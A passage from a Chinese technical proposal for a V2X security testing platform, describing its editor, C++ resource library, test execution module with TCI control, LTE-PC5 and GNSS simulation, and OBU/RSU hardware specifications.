class="headerlink" title="功能实施方案"></a>功能实施方案</h6><p>提供的V2X安全检测平台的核心编辑器具备标准的文本编辑功能，包括打开、保存、复制、粘贴、查找和替换等操作。这些基础功能确保用户能够轻松地进行文本编辑和修改，从而提高测试用例的编写效率。为了提高用户的使用体验，核心编辑器还具备良好的性能和响应速度，确保编辑操作的流畅性和准确性。</p><p>为了提高核心编辑器的可用性和便利性，支持一系列附加功能。这些功能包括但不限于可配置的语法高亮显示、代码折叠、内容助手、文本格式化、内容大纲和代码模板等。语法高亮显示功能可以根据不同的语法规则对代码进行颜色区分，从而帮助用户更好地理解代码结构。代码折叠功能允许用户对代码块进行折叠或展开，以便于浏览和编辑长代码文件。内容助手可以为编写代码提供智能提示和自动补全，提高编码效率。文本格式化则可以对选定的文本进行格式调整。内容大纲可以帮助用户快速了解代码的整体结构，而代码模板则为用户提供了一些常用的代码片段，减少重复编写的工作量。</p><h6 id="技术实现内容-27"><a href="#技术实现内容-27" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>核心编辑器支持提供标准的文本编辑功能，例如打开/保存、复制/粘贴、查找/替换等。还提供对用户友好的附加功能，如可配置的语法高亮显示、代码折叠、内容助手、文本格式化、内容大纲、代码模板和语义检查器等。</p><p>核心编辑器是软件开发环境中的关键组件，它提供了一系列标准和高级的文本编辑功能，旨在提高开发人员的工作效率和代码质量。基础功能包括打开和保存文件，这是编辑器的基本要求，允许用户加载现有代码或文本文件到编辑器中进行修改，并保存更改。复制和粘贴功能使得用户可以轻松地在文档中或跨文档复制文本，而查找和替换功能则提供了一个快速定位和修改特定字符串的有效手段。</p><p>除了这些标准功能之外，核心编辑器还提供了一系列用户友好的附加功能，以进一步提升用户体验。可配置的语法高亮显示是其中一个特色功能，它根据不同的编程语言语法规则，以不同的颜色和样式突出显示代码，使得阅读和理解代码更加简单直观。代码折叠功能允许用户隐藏或显示代码块，这在处理大型文件时特别有用，因为它可以帮助用户专注于当前正在编辑的代码段。</p><p>内容助手是一种智能提示工具，它在编写代码时提供自动完成、参数信息和成员列表，极大地提高了编码速度和准确性。文本格式化功能自动调整代码的缩进和对齐，保持代码的整洁和一致性。内容大纲提供了文档结构的鸟瞰图，让用户能够快速导航到代码的不同部分。</p><p>代码模板是预定义的代码片段，用户可以通过简单的触发词来插入常用的代码结构，从而节省时间并减少重复性工作。最后，语义检查器则是一个强大的工具，它超越了简单的语法高亮显示，能够理解代码的语义，检查潜在的逻辑错误、未定义的变量和类型不匹配等问题，帮助开发者在代码编写阶段就预防错误。</p><p>总而言之，核心编辑器通过集成这些功能，为用户提供了一个强大、灵活和高效的编码环境，使得代码的编写、修改和维护工作变得更加便捷和准确。</p><h5 id="底层资源库"><a href="#底层资源库" class="headerlink" title="底层资源库"></a>底层资源库</h5><h6 id="功能实施方案-31"><a href="#功能实施方案-31" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><p>为了满足V2X安全检测平台的需求，底层资源库模块的设计至关重要。提供的底层资源库模块包含独立的底层资源库，与实际测试套件分离，可以提前编译成二进制的手工编写的C++代码组成的公共和静态库部分。这样可以确保其稳定性和可移植性，同时也便于管理和维护。</p><p>底层资源库将由手工编写的C++代码组成，涵盖公共和静态库部分。这些代码将包括表示基本数据类型的C++类，以及实现语言内置操作的函数。例如，提供定时器、端口、测试组件和判断处理等函数，以支持各种测试场景。此外，底层资源库还将包含其他辅助功能，包括日志和配置文件处理例程，以支持可执行测试套的顺利运行。</p><h5 id="技术实现内容-28"><a href="#技术实现内容-28" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>底层资源库包含独立于实际测试套件的可以提前编译成二进制的手工编写的C++代码组成的公共和静态库部分。底层资源库包括表示基本数据类型的C++类和实现语言的内置操作的函数（例如定时器、端口、测试组件和判断处理）以及运行可执行测试套的其他辅助功能（例如日志和配置文件处理例程）。</p><p>底层资源库是软件测试框架中的核心组件，它提供了一系列预先编写好的、可复用的代码库，这些代码库是用C++编写的，并且可以独立于具体的测试套件存在。这些资源库的主要目的是为了提供一个稳定和高效的基础，以支持上层的测试套件运行。</p><p>由于这些库是用C++编写的，它们可以在使用前编译成二进制形式，这意味着它们在测试执行时的性能非常高，因为已经是编译好的机器代码。这种预编译的方法可以显著减少测试执行时的延迟，因为避免了在测试时进行即时编译的需要。</p><p>底层资源库包含了多个关键部分：</p><p>1. 公共和静态库：这些库包含了可以在多个测试套件之间共享的代码，这样的设计减少了代码重复，并且使得维护更为简单。静态库是在编译时链接到测试套件中的，它们成为了最终测试应用程序的一部分。</p><p>2. 基本数据类型的C++类：这些类表示了编程语言中的基本数据类型，并且可能提供了额外的功能，比如数据验证或者特殊的数据操作，这些操作在标准C++库中可能不可用。</p><p>3. 内置操作的函数：这些函数实现了语言的基本操作，比如定时器（用于控制测试的时间敏感部分）、端口（用于与被测试系统交互的接口）、测试组件（用于构建测试用例的基本构建块）和判断处理（用于评估测试结果是否符合预期）。</p><p>4.其他辅助功能：为了支持测试套的运行，底层资源库还包括了其他辅助功能，比如日志处理例程（用于记录测试过程中的各种事件），配置文件处理例程（用于读取和解析配置文件中的设置），这些功能对于管理测试流程和结果分析至关重要。</p><p>通过将这些底层的、通用的、性能优化的代码组件封装在资源库中，测试开发人员可以更加专注于具体的测试逻辑和测试用例的实现。这种分层的架构设计不仅提高了代码的复用性，还降低了测试系统的复杂性，使得测试的开发和维护更加高效。</p><h4 id="测试组件设计-amp-执行模块"><a href="#测试组件设计-amp-执行模块" class="headerlink" title="测试组件设计&amp;执行模块"></a>测试组件设计&amp;执行模块</h4><h5 id="功能实施方案-32"><a href="#功能实施方案-32" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>根据技术要求，提供的测试组件设计&amp;执行模块能够为测试系统提供控制中心和UI展现功能，以便更好地管理和监控测试过程。实现各设备的运行、系统自检以及可执行测试用例的运行等功能，以确保测试的完整性和准确性。</p><p>此外，通过TCI命令接口对IUT实现自动化测试及控制。TCI命令接口是一种通用的测试命令接口，能够实现对IUT的快速、准确控制，从而提高测试效率和准确性。并利用这一接口，对IUT进行自动化测试及控制，确保其正常运行和准确响应。</p><h5 id="技术实现内容-29"><a href="#技术实现内容-29" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>测试组件设计&amp;执行模块支持为测试系统提供控制中心和UI展现功能。实现各设备运行、系统自检以及可执行测试用例的运行，并且通过TCI命令接口对IUT实现自动化测试及控制。</p><p>测试组件设计&amp;执行模块是测试系统中的关键部分，它扮演着控制中心的角色，并提供用户界面（UI）以便于用户与测试系统交互。该模块的设计和实现关乎整个测试系统的效率和易用性。</p><p>控制中心：作为测试系统的神经中枢，控制中心负责协调和管理测试流程。它需要能够启动和停止测试，处理测试用例的加载、执行和调度，以及监控测试的进度。控制中心还需具备故障检测和恢复功能，以确保测试能够在出现问题时能够恰当地处理，并尽可能地自动化。</p><p>UI展现功能：用户界面为用户提供了一个直观的操作平台，使他们能够轻松地配置测试参数、启动和停止测试、查看测试进度和结果。一个好的UI设计可以大大提高用户的工作效率，尤其是在复杂的测试场景中。用户界面可能包括仪表板、日志窗口、测试用例编辑器、结果展示器等组件。</p><p>设备运行和系统自检：测试组件设计&amp;执行模块需要能够管理各个测试设备的运行状态，包括硬件设备和软件应用。在测试开始之前，模块应能执行系统自检，确保所有设备均处于良好状态，准备就绪，这包括检查网络连接、设备响应以及必要的服务是否运行等。</p><p>可执行测试用例的运行：该模块需要支持加载和执行具体的测试用例，包括单个测试用例和测试序列。它应能够处理并发执行、测试优先级和依赖管理，同时提供足够的灵活性以支持不同类型的测试策略。</p><p>TCI命令接口：测试控制接口（TCI）是一个标准的接口，允许测试组件设计&amp;执行模块通过编程方式与被测系统（IUT）进行交互。通过TCI，模块可以发送命令以控制IUT，实现自动化测试。这包括启动和停止IUT上的进程、设置和查询参数、以及收集测试结果等。</p><p>自动化测试及控制：自动化是现代测试系统的核心特性。测试组件设计&amp;执行模块应该能够自动执行测试案例，无需人工干预，从而提高测试的效率和可靠性。自动化控制包括对测试流程的控制、测试数据的生成和处理，以及测试结果的收集和分析。</p><p>综上所述，测试组件设计&amp;执行模块的实现需要综合考虑用户操作的便捷性、测试流程的自动化和测试结果的准确性，以确保整个测试系统能够高效、稳定地运行。</p><h3 id="测试环境基础平台"><a href="#测试环境基础平台" class="headerlink" title="测试环境基础平台"></a>测试环境基础平台</h3><h4 id="V2X数据模拟"><a href="#V2X数据模拟" class="headerlink" title="V2X数据模拟"></a>V2X数据模拟</h4><h5 id="功能实施方案-33"><a href="#功能实施方案-33" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供系统的V2X数据模拟功能，能够支持LTE-PC5数据模拟。这套系统具备先进的数据模拟功能，可以满足LTE-V2X网络数据收发模拟实现的需求。</p><p>该系统基于先进的模拟技术，能够模拟真实的LTE-PC5数据通信环境，提供高度逼真的数据收发模拟场景。用户可以根据测试需求，通过系统的用户界面进行灵活的参数配置和场景设置，以适应不同的测试条件和要求。</p><h5 id="技术实现内容-30"><a href="#技术实现内容-30" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>V2X数据模拟支持LTE-PC5数据模拟，满足LTE-V2X网络数据收发模拟实现。</p><p>V2X（车联网）数据模拟是指模拟车辆之间或车辆与基础设施之间的通信数据交互过程，以便进行车联网系统的测试、验证和性能评估。V2X数据模拟旨在模拟实际交通场景中的各种通信事件和情况，以生成真实的V2X数据流，供系统开发人员和测试人员使用。</p><p>以下是对V2X数据模拟的一般描述：</p><p>数据生成：V2X数据模拟需要生成各种类型的数据，包括车辆信息、位置信息、传感器数据、交通事件等。这些数据可以通过模拟算法、仿真模型或真实数据采集来生成。</p><p>通信协议：V2X数据模拟需要遵循车联网通信协议，如IEEE 802.11p/WAVE（无线接入于车辆环境）或LTE-V2X（基于LTE的车联网通信）。模拟的数据应符合相应的协议规范和数据格式。</p><p>交通场景模拟：V2X数据模拟应考虑不同的交通场景，包括城市道路、高速公路、交叉口等。模拟的数据包括车辆之间的通信、车辆与基础设施之间的通信，以及车辆与行人或其他障碍物之间的交互。</p><p>时空关系：V2X数据模拟需要考虑数据在时间和空间上的关系。模拟的数据应具有合理的时间戳和位置信息，以便准确地模拟车辆之间的通信和交互。</p><p>数据多样性：V2X数据模拟涵盖各种不同类型的数据，以测试和评估车联网系统的性能和鲁棒性。这包括不同类型的车辆、不同的交通状况、不同的通信范围和信号强度等。</p><p>数据量和速率：V2X数据模拟需要考虑生成大规模的数据，并模拟不同的数据传输速率和通信频率。用于评估车联网系统在不同负载和网络条件下的性能和可靠性。</p><p>数据验证和分析：V2X数据模拟生成的数据应进行验证和分析，以确保其与实际情况的一致性和准确性。包括数据质量检查、通信消息的解析和验证、事件触发的正确性等。</p><h4 id="驾驶数据模拟"><a href="#驾驶数据模拟" class="headerlink" title="驾驶数据模拟"></a>驾驶数据模拟</h4><h5 id="功能实施方案-34"><a href="#功能实施方案-34" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供的驾驶数据模拟具备强大的功能和灵活性，支持实验室测试和外场测试两种场景：</p><ol><li>支持外场测试模式，在外场测试中，车辆利用卫星定位信号进行驾驶行为的精准指引，确保车辆按照测试用例的需求的路线和要求，指引驾驶行为，支持在外场测试场地中行驶，完成测试执行，为测试执行提供强有力的支持。</li><li>支持实验室测试模式，实验室测试中，支持GNSS信号放大器，以增强卫星信号的强度。这使得部件通信模组能够更好地接收和处理卫星信号，为OBU、RSU部件的测试提供稳定、可靠的数据传输，通过GNSS信号放大器的支持，能够构建接近真实的卫星信号环境，为OBU、RSU部件的测试提供最佳的信号条件，完成对OBU、RSU部件的测试。这有助于发现和解决在实际应用中可能出现的问题，提高测试的准确性和可靠性。</li><li>提供的GNSS辅助工具参数满足：</li></ol><ul><li>BeiDou频段: 支持BeiDou频段。此配置确保了与北斗卫星导航系统的准确对接，为用户提供稳定的信号接收能力。</li><li>GPS频段: 支持GPS频段。此设计确保与GPS系统的高度兼容性，确保在各种环境中都能获取到精确的定位信息。</li><li>GLONASS频段: 支持GLONASS频段。这一配置增强了与GLONASS卫星导航系统的连接稳定性，确保用户获得连续、可靠的定位服务。</li></ul><p>（4）提供的OBU设备满足以下参数：</p><ul><li>天线配置：OBU设备包含2路LTE-V天线和1路GNSS天线。这些天线不仅提供了稳定的信号接收能力，其中2路LTE-V天线还支持TX/RX Antenna Diversity技术，增强了信号传输的可靠性和抗干扰能力，确保了高精度的定位信息。此外，该设备支持多种卫星导航系统，包括GPS、GLONASS、BeiDou和Galileo，为用户提供全球覆盖的定位服务。</li><li>内存与存储：OBU设备配备了1GB的DDR运行内存，确保了流畅的多任务处理能力。同时，其存储空间为8GB的EMMC，并支持Micro TF卡扩展，为用户提供了充足的存储空间。</li><li>CAN通讯接口：该设备支持2路高速CAN 2.0B通讯协议，最大波特率为1Mbps，满足了汽车工业中对于实时通讯的需求。OBU设备能够与车辆内部的其他ECU进行快速、稳定的数据交换。这种高速通讯接口也有助于提高车辆故障诊断的准确性和效率。</li><li>以太网接口：还包含一路千兆RJ45以太网接口，支持高速数据传输和网络连接。以太网接口的普及性和兼容性也使得OBU设备能够方便地与其他设备和系统进行连接和集成。</li><li>4G模块特性：内置的4G模块支持2G/3G/4G通信，保证了数据传输的速度和稳定性。这种设计确保了在不同地区和不同网络环境下，设备都能够保持稳定的通信连接。</li><li>LTE-V模组：该设备具备LTE-V模组。TE-V模组作为OBU设备的关键组件，支持V2X通信。确保了V2X相关协议栈和网络安全模块的高效运行，提升了数据处理的速度和准确性。</li><li>通信性能：OBU设备的最大有效通信距离不小于150m，在较远的距离上仍能保持稳定的通信效果，满足各种实际应用场景的需求。此外，通过不同长度的报文进行测试时，该设备的通信抖动幅度表现出高度的稳定性。</li></ul><ol><li>提供的RSU设备满足以下参数：</li></ol><ul><li>电源与工作条件：提供的RSU设备的额定工作电压为12V，确保了在汽车系统中稳定运行。其额定工作电压范围为9-36V，适应不同车型的电压需求。</li><li>工作电流与最大电流：设备的工作电流小于2A，确保了低功耗。其最大电流小于4A，允许设备在短时间内处理高负载任务。工作电流和最大电流的限制是为了确保RSU设备不会对车辆的电源系统造成过大的负载。长时间工作在超过设计的电流值下可能会导致设备过热、性能下降或损坏。通过设定严格的工作电流和最大电流限制，可以保证RSU设备的安全和稳定运行。</li><li>存储与扩展性：RSU设备配备了EMMC 8GB的存储空间、DDR 1GB的运行内存，并支持Micro TF card扩展，为用户提供了充足的存储和运行资源。这些存储资源能够满足RSU设备在处理大量数据时的存储需求。</li><li>网络接口：设备配备1路千兆RJ45接口，支持高速数据传输和网络连接。这种接口支持多种通信协议和标准，能够满足各种数据传输需求。该接口还具备较好的兼容性和可扩展性，方便与其他设备的集成和互操作。</li><li>GNSS性能：RSU设备的GNSS天线更新频率高达10Hz，提供了高精度的定位信息。确保了准确的定位结果。该设备支持多种卫星导航系统，包括GPS、GLONASS、BeiDou和Galileo，为用户提供全球覆盖的定位服务。这种高频率更新确保了定位精度和实时性，适用于需要精确位置信息的各种应用场景。</li><li>通讯能力：RSU设备具备2G/3G/4G通讯能力，这使得设备能够与各种移动网络进行无缝连接，满足实时通讯的需求。</li><li>输入输出功能：设备支持1路LED输出功能，使得用户可以根据实际需求对外部进行指示或显示相关信息。这种功能扩展了设备的应用范围，提高了其实用性。</li></ul><h5 id="技术实现内容-31"><a href="#技术实现内容-31" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>驾驶数据模拟支持实验室测试和外场测试两个场景：</p><p>（1）在外场测试中，车辆使用卫星定位信号，根据测试用例需求进行驾驶行为指引，在外场测试场地中行驶，完成测试执行。</p><p>（2）实验室测试中，支持GNSS信号放大器为部件通信模组工作提供必要的卫星信号，完成对OBU、RSU部件的测试。</p><p>驾驶数据模拟是指在实验室测试和外场测试两个场景下，通过模拟驾驶行为和交通场景，生成真实的驾驶数据，以进行系统开发、测试和评估。</p><p>实验室测试场景：</p><p>- 环境模拟：在实验室中，可以使用驾驶模拟器或虚拟现实技术来模拟不同的驾驶环境，包括城市道路、高速公路、交叉口等。模拟的环境可以具有多样性，以涵盖不同的交通状况和驾驶挑战。</p><p>- 驾驶行为模拟：通过模拟器或虚拟现实技术，可以模拟真实驾驶中的各种行为，如加速、刹车、转向、变道等。模拟的驾驶行为应具有真实性和多样性，以覆盖不同的驾驶风格和行为模式。</p><p>- 传感器数据模拟：在实验室测试中，可以通过传感器模拟器来生成各种传感器数据，如摄像头图像、雷达数据、激光雷达数据等。这些数据可以用于测试和评估驾驶辅助系统或自动驾驶系统的感知和决策能力。</p><p>- 系统性能评估：通过实验室测试，可以评估驾驶辅助系统或自动驾驶系统在各种驾驶场景下的性能和鲁棒性。可以通过模拟不同的驾驶情况和故障情况，来测试系统的响应能力和容错能力。</p><p>外场测试场景：</p><p>- 实际道路测试：在外场测试中，可以将测试车辆装备传感器和数据采集设备，进行实际道路测试。测试车辆可以驾驶在真实的交通环境中，采集真实的驾驶数据和传感器数据。</p><p>- 数据记录和分析：外场测试中，测试车辆会记录驾驶数据和传感器数据，包括车辆状态、位置信息、传感器输出等。这些数据可以后续进行分析，评估系统的性能、安全性和可靠性。</p><p>- 环境多样性：外场测试可以在不同的地理位置和交通状况下进行，以涵盖多样的驾驶场景。测试车辆可以在城市道路、高速公路、乡村道路等不同环境中进行测试，以验证系统在各种条件下的表现。</p><p>- 现场故障模拟：在外场测试中，可以模拟各种故障情况，如传感器故障、通信中断、道路障碍物等，以测试系统的容错和应对能力。</p><p>（3）GNSS辅助工具参数</p><ul><li>BeiDou</li><li>GPS</li><li>GLONASS</li></ul><p>（4）OBU设备参数</p><ul><li>天线：包含2路LTE-V与1路GNSS天线，其中2路LTE-V天线可以做TX/RX Antenna Diversity；GNSS支持制式：GPS、GLONASS、BeiDou、Galileo。</li><li>运行内存：1GB DDR，存储空间8GB EMMC，且支持Micro TF card扩展。</li><li>CAN通讯：支持2路高速CAN 2.0B，最大波特率1Mbps。</li><li>以太网接口：包含一路千兆RJ45接口。</li><li>4G模块:支持2G/3G/4G通信</li><li>LTE-V模组：支持V2X通信。</li><li>通信性能：最大有效通信距离等于150m，通过不同长度的报文时，通信抖动幅度稳定。</li></ul><p>（5）RSU设备参数</p><ul><li>额定工作电压：12V</li><li>额定工作电压范围：9-36V</li><li>工作电流：2A</li><li>最大电流：4A</li><li>Memory：EMMC 8GB、DDR 1GB、支持Micro TF card 扩展</li><li>1路千兆RJ45接口</li><li>GNSS：更新频率：10Hz</li><li>GNSS支持制式：GPS、GLONASS、BeiDou、Galileo</li><li>2G/3G/4G通讯</li><li>输入输出：支持1路LED输出功能</li></ul><h3 id="测试模拟系统"><a href="#测试模拟系统" class="headerlink" title="测试模拟系统"></a>测试模拟系统</h3><h4 id="系统体系结构"><a href="#系统体系结构" class="headerlink" title="系统体系结构"></a>系统体系结构</h4><h5 id="功能实施方案-35"><a href="#功能实施方案-35" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>1）提供测试系统基础模块</p><p>该模块基于跨平台的C++图形用户界面应用程序开发框架搭建，实现端到端V2X无线通信系统测试平台。它包含以下基础功能模块：</p><p>工程向导：负责新工程的创建和管理。工程向导将自动解压资源模板包，并生成工程项目目录，以便用户更高效地组织和管理测试资源。</p><p>核心编辑器：完全遵循相关开发平台的标准规范，提供全面的文本编辑功能，包含打开/保存、复制/粘贴、查找/替换等。此外，核心编辑器还具备一系列对用户友好的附加功能，包括可配置的语法高亮显示、代码折叠、内容助手、文本格式化、内容大纲、代码模板和语义检查器等，以提高开发效率和代码质量。</p><p>底层资源库：包含一组独立的C++代码库，这些代码库可以提前编译成二进制形式。这些底层资源库为测试系统提供稳定的支持，包括公共库和静态库部分。</p><p>2）工程向导</p><p>工程向导模块负责新工程的创建和管理，并组织和管理Q资源。当通过工程向导创建新的工程项目时，系统将自动解压资源模板包，并生成相应的工程项目目录。这将为用户提供一个清晰的项目结构，方便他们进行后续的开发和测试工作。</p><p>（1）提供核心编译器</p><p>提供的核心编译器模块支持相关开发平台的标准规范，提供全面的、标准的文本编辑功能，例如打开/保存、复制/粘贴、查找/替换等。此外，它还提供一些对用户友好的附加功能，包括可配置的语法高亮显示、代码折叠、内容助手、文本格式化、内容大纲、代码模板和语义检查器等。这些功能将帮助用户更高效地进行开发和调试，提高代码质量和开发效率。</p><p>（2）提供底层资源库</p><p>提供的底层资源库包含一组独立的C++代码库，这些代码库可以提前编译成二进制形式。这些底层资源库为测试系统提供稳定的支持，包括公共库和静态库部分。通过使用这些资源库，测试系统可以更快速地构建和部署，同时确保系统的稳定性和可靠性。</p><p>（3）提供测试组件设计&amp;执行模块</p><p>提供的该模块能够实现测试组件设计&amp;执行模块为测试系统提供控制中心和UI展现功能，能够实现个设备运行、系统自检以及可执行测试用例的运行，并且通过TCI命令接口对IUT实现自动化测试及控制。测试组件设计&amp;执行模块为测试系统提供控制中心和UI展现功能。它支持各种设备的运行、系统自检以及可执行测试用例的运行。这将大大提高测试的效率和准确性，并为用户提供一个直观的界面来监控和执行测试用例。</p><p>3）提供V2X测试模拟设备</p><p>该模块的硬件平台能够提供以太网硬件接口、CAN总线接口、GNSS模块、调试工具模块以及底层V2X通信芯片模块。基于这些硬件平台，部署相符性测试工具的各个软件模块，包括：</p><p>消息转发模块：负责测试数据的接收和发送，确保数据传输的准确性和实时性。</p><p>数据处理模块：对接收到的测试数据进行处理和分析，提取有用的信息，为后续的测试结果评估提供依据。</p><p>底层V2X通信协议栈：支持V2X通信协议的实现，确保设备之间的通信顺畅。</p><p>其他辅助模块：提供额外的功能支持，如日志记录、配置管理等，以完善整个测试模拟系统的功能。</p><h5 id="技术实现内容-32"><a href="#技术实现内容-32" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="测试系统基础模块"><a href="#测试系统基础模块" class="headerlink" title="测试系统基础模块"></a>测试系统基础模块</h6><p>该模块能实现端到端V2X无线通信系统测试平台基于跨平台C++ 图形用户界面应用程序开发框架平台搭建，提供如下基础功能模块：工程向导、核心编辑器、底层资源库等。</p><h6 id="工程向导-1"><a href="#工程向导-1" class="headerlink" title="工程向导"></a>工程向导</h6><p>该模块实现工程向导负责新建工程，并且用于组织和管理Q资源。当通过工程向导创建新的工程项目时，系统自动解压资源模板包，并且生成工程项目目录。</p><p>在软件开发和测试环境中，工程向导模块扮演着至关重要的角色，尤其是在项目初始化和资源管理方面。这个模块的设计意图是简化和自动化新工程项目的创建过程，同时提供一套标准化和易于管理的资源和项目结构。</p><p>新建工程：工程向导的首要功能是引导用户通过创建新工程项目的过程。这通常涉及收集用户输入的关键信息，如项目名称、类型、目标平台、编程语言等。工程向导可能还会询问用户是否需要特定的配置或依赖库，以及其他任何项目初始化时需要考虑的选项。</p><p>组织和管理Q资源：所谓的Q资源可能是指那些特定于公司或项目的库、框架、模板或其他工具。工程向导会有一个资源库，其中存放了这些Q资源的集合。这些资源可以是预先定义好的代码文件、文档模板、配置文件、脚本等，它们用于加速开发进程并保持项目的一致性。</p><p>自动解压资源模板包：一旦用户完成了新建工程的配置，工程向导会自动执行资源模板包的解压操作。资源模板包是一组预先定义好的文件和目录，它们构成了工程项目的基础框架。这个自动化步骤省去了用户手动设置项目结构的麻烦，同时减少了因配置错误而可能导致的问题。</p><p>生成工程项目目录：资源模板包解压后，工程向导将生成工程项目的目录结构。这个结构通常包括源代码目录、资源目录、第三方库目录、构建系统配置目录等。一个良好的目录结构是项目成功的关键，因为它影响到版本控制、代码维护和团队协作。</p><p>通过这样的设计，工程向导模块不仅提高了项目创建的效率，还确保了每个新项目都能够遵循组织内部的最佳实践和标准。这对于维护大型项目和确保项目质量是非常重要的，它允许开发者专注于实现业务逻辑，而不是消耗时间在设置和配置项目上。</p><p>V2X测试模拟设备</p><p>该模块实现硬件平台提供以太网硬件接口、CAN总线接口、GNSS模块、调试工具模块已经底层V2X通信芯片模块。基于硬件平台之上，该设备部署相符性测试工具的各个软件模块，包括消息转发模块、数据处理模块、底层V2X通信协议栈及相应的辅助模块。</p><p>消息转发模块</p><p>该模块实现消息转发模块支持通过TCP/IP有线和软件测试系统之间通信。</p><p>V2X测试模拟设备的消息转发模块和软件测试系统之间通过TCP/IP有线通信，和软件测试系统之间符合TCI标准，当软件测试系统发送消息时，将消息内容以TCP/IP报文的payload形式发送给该模块。该模块将符合TCI标准的消息解析，解析出要发送的消息透传给数据处理模块；同时，当V2X测试模拟设备接收到V2X报文时，需要将V2X转换给符合TCI标准的TCP/IP报文发送给软件测试系统。</p><p>数据处理模块</p><p>该模块提供基于底层协议栈的发送及接收功能。</p><p>协议栈模块</p><p>该模块实现符合V2X标准的协议栈，用于和待测设备之间进行V2X无线通信协议栈包括网络层、消息层及信息安全。</p><p>辅助模块</p><p>该模块实现GNSS数据处理功能、CAN数据处理功能、日志系统及测试调试功能，支持处理GPS数据、CAN总线数据、运行时产生日志及运行时问题跟踪定位功能。</p><h6 id="核心编译器"><a href="#核心编译器" class="headerlink" title="核心编译器"></a>核心编译器</h6><p>该模块实现核心编辑器完全支持相关开发平台标准规范，它不仅提供了标准的文本编辑功能，例如打开/保存、复制/粘贴、查找/替换等，还提供了一些对用户友好的附加功能，包括可配置的语法高亮显示、代码折叠、内容助手、文本格式化、内容大纲、代码模板和语义检查器等。</p><p>核心编辑器是软件开发环境中的关键组件，它提供了一系列标准和高级的文本编辑功能，旨在提高开发人员的工作效率和代码质量。基础功能包括打开和保存文件，这是编辑器的基本要求，允许用户加载现有代码或文本文件到编辑器中进行修改，并保存更改。复制和粘贴功能使得用户可以轻松地在文档中或跨文档复制文本，而查找和替换功能则提供了一个快速定位和修改特定字符串的有效手段。</p><p>除了这些标准功能之外，核心编辑器还提供了一系列用户友好的附加功能，以进一步提升用户体验。可配置的语法高亮显示是其中一个特色功能，它根据不同的编程语言语法规则，以不同的颜色和样式突出显示代码，使得阅读和理解代码更加简单直观。代码折叠功能允许用户隐藏或显示代码块，这在处理大型文件时特别有用，因为它可以帮助用户专注于当前正在编辑的代码段。</p><p>内容助手是一种智能提示工具，它在编写代码时提供自动完成、参数信息和成员列表，极大地提高了编码速度和准确性。文本格式化功能自动调整代码的缩进和对齐，保持代码的整洁和一致性。内容大纲提供了文档结构的鸟瞰图，让用户能够快速导航到代码的不同部分。</p><p>代码模板是预定义的代码片段，用户可以通过简单的触发词来插入常用的代码结构，从而节省时间并减少重复性工作。最后，语义检查器则是一个强大的工具，它超越了简单的语法高亮显示，能够理解代码的语义，检查潜在的逻辑错误、未定义的变量和类型不匹配等问题，帮助开发者在代码编写阶段就预防错误。</p><h6 id="底层资源库-1"><a href="#底层资源库-1" class="headerlink" title="底层资源库"></a>底层资源库</h6><p>该模块实现底层资源库包含独立于实际测试套件的可以提前编译成二进制的手工编写的C++代码组成的公共和静态库部分。</p><p>底层资源库是软件测试框架中的核心组件，它提供了一系列预先编写好的、可复用的代码库，这些代码库是用C++编写的，并且可以独立于具体的测试套件存在。这些资源库的主要目的是为了提供一个稳定和高效的基础，以支持上层的测试套件运行。</p><p>由于这些库是用C++编写的，它们可以在使用前编译成二进制形式，这意味着它们在测试执行时的性能非常高，因为已经是编译好的机器代码。这种预编译的方法可以显著减少测试执行时的延迟，因为避免了在测试时进行即时编译的需要。</p><h6 id="测试组件设计-amp-执行模块-1"><a href="#测试组件设计-amp-执行模块-1" class="headerlink" title="测试组件设计&amp;执行模块"></a>测试组件设计&amp;执行模块</h6><p>该模块实现测试组件设计&amp;执行模块为测试系统提供控制中心和UI展现功能。实现个设备运行、系统自检以及可执行测试用例的运行，并且通过TCI命令接口对IUT实现自动化测试及控制。</p><p>底层资源库是软件测试框架中的核心组件，它提供了一系列预先编写好的、可复用的代码库，这些代码库是用C++编写的，并且可以独立于具体的测试套件存在。这些资源库的主要目的是为了提供一个稳定和高效的基础，以支持上层的测试套件运行。</p><p>由于这些库是用C++编写的，它们可以在使用前编译成二进制形式，这意味着它们在测试执行时的性能非常高，因为已经是编译好的机器代码。这种预编译的方法可以显著减少测试执行时的延迟，因为避免了在测试时进行即时编译的需要。</p><h6 id="V2X测试模拟设备"><a href="#V2X测试模拟设备" class="headerlink" title="V2X测试模拟设备"></a>V2X测试模拟设备</h6><p>该模块实现硬件平台提供以太网硬件接口、CAN总线接口、GNSS模块、调试工具模块已经底层V2X通信芯片模块。基于硬件平台之上，该设备部署相符性测试工具的各个软件模块，包括消息转发模块、数据处理模块、底层V2X通信协议栈及相应的辅助模块。</p><p>该模块描述了一个综合性的测试设备，它集成了多种硬件接口和软件组件，用于执行车辆通信系统（如V2X，即Vehicle-to-Everything）的相符性测试。这类测试是为了确保车辆通信系统的实现与相关的标准和规范相一致。以下是模块的关键组成部分及其功能的详细说明：</p><p>硬件平台接口：</p><p>1.以太网硬件接口：提供标准的网络通信能力，允许测试设备通过以太网与其他系统或测试设备进行数据交换。</p><p>2.CAN总线接口：用于连接车辆内部网络，实现与车辆控制单元（ECUs）的通信，这对于集成测试和车辆系统的诊断至关重要。</p><p>3.GNSS模块：全球导航卫星系统（GNSS）模块提供精确的时间和地理位置信息，这是V2X通信中位置相关服务的关键组成部分。</p><p>4.调试工具模块：用于监测、调试和分析硬件平台的运行状态，帮助开发人员定位问题和优化系统性能。</p><p>5.底层V2X通信芯片模块：这是实现车辆与车辆、车辆与基础设施通信的核心硬件组件，支持V2X通信的各种标准和协议。</p><p>软件模块：</p><p>1.消息转发模块：负责在测试设备内部以及设备与外部系统之间转发V2X消息，确保消息能够正确地从源点传输到目标点。</p><p>2.数据处理模块：对接收和发送的数据进行处理，包括数据验证、编码、解码和必要的转换，以符合V2X通信的要求。</p><p>3.底层V2X通信协议栈：实现V2X通信所需的各种协议，包括物理层、数据链路层、网络层和应用层协议。这个协议栈是确保与其他V2X设备互操作性的基础。</p><p>4.辅助模块：包括日志